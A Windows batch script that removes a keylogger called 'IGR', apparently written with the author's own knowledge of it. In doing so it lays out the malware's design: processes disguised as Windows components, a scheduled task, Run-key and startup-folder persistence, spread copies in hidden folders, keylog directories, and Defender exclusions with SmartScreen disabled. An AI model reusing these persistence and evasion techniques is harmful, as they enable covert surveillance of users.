@echo off
setlocal enabledelayedexpansion

REM Auto-elevate to admin (needed to remove scheduled task and Defender exclusions)
>nul 2>&1 net session || (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================
echo   IGR Cleanup - Remove All Traces
echo ============================================
echo.

REM Kill running instances
echo [1/8] Stopping processes...
taskkill /f /im winruntime.exe >nul 2>&1
taskkill /f /im WindowsRuntime.exe >nul 2>&1
taskkill /f /im SystemService.exe >nul 2>&1
taskkill /f /im RuntimeBroker.exe >nul 2>&1
taskkill /f /im WpnService.exe >nul 2>&1
echo   Done.

REM Remove scheduled task
echo.
echo [2/8] Removing scheduled task...
schtasks /delete /tn "WindowsRuntime" /f >nul 2>&1
echo   Done.

REM Remove registry persistence
echo.
echo [3/8] Removing registry persistence...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsRuntime" /f >nul 2>&1
echo   Done.

REM Remove startup shortcut
echo.
echo [4/8] Removing startup shortcut...
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%STARTUP_DIR%\WindowsRuntime.lnk" (
    del /f /q "%STARTUP_DIR%\WindowsRuntime.lnk" >nul 2>&1
    echo   Deleted: %STARTUP_DIR%\WindowsRuntime.lnk
) else (
    echo   Not found
)

REM Remove install directory
echo.
echo [5/8] Removing install directory...
set "INSTALL_DIR=%APPDATA%\Microsoft\WindowsRuntime"
if exist "%INSTALL_DIR%" (
    attrib -h -s "%INSTALL_DIR%" >nul 2>&1
    attrib -h -s "%INSTALL_DIR%\*" >nul 2>&1
    rd /s /q "%INSTALL_DIR%" >nul 2>&1
    if exist "%INSTALL_DIR%" (
        echo   WARNING: Could not fully delete - files may be in use
    ) else (
        echo   Deleted: %INSTALL_DIR%\
    )
) else (
    echo   Not found
)

REM Remove internal spread copies
echo.
echo [6/8] Removing spread copies...
for %%d in (
    "%APPDATA%\Microsoft\WindowsRuntime"
    "%LOCALAPPDATA%\Microsoft\SystemService"
    "%APPDATA%\Microsoft\Windows\RuntimeBroker"
    "%PROGRAMDATA%\WpnService"
) do (
    if exist %%d (
        attrib -h -s %%d >nul 2>&1
        attrib -h -s %%d\* >nul 2>&1
        rd /s /q %%d >nul 2>&1
        echo   Removed: %%d
    )
)

REM Remove keylog marker and log directories
echo.
echo [7/8] Removing keylog files...
set "MARKER=%APPDATA%\.igr_path"
if exist "%MARKER%" (
    for /f "usebackq delims=" %%p in ("%MARKER%") do (
        set "LOGDIR=%%p"
        if exist "!LOGDIR!" (
            attrib -h -s "!LOGDIR!" >nul 2>&1
            rd /s /q "!LOGDIR!" >nul 2>&1
            echo   Deleted: !LOGDIR!\
        )
    )
    del /f /q "%MARKER%" >nul 2>&1
    echo   Deleted: %MARKER%
) else (
    echo   Not found
)

REM Remove Defender exclusions and re-enable SmartScreen
echo.
echo [8/8] Restoring security settings...
powershell -Command "Remove-MpPreference -ExclusionPath '%APPDATA%\Microsoft\WindowsRuntime' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess 'winruntime.exe' -ErrorAction SilentlyContinue; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 1 -Force -ErrorAction SilentlyContinue"
echo   Done.

echo.
echo ============================================
echo   CLEANUP COMPLETE
echo ============================================
echo   All IGR traces removed.
echo ============================================
echo.
pause
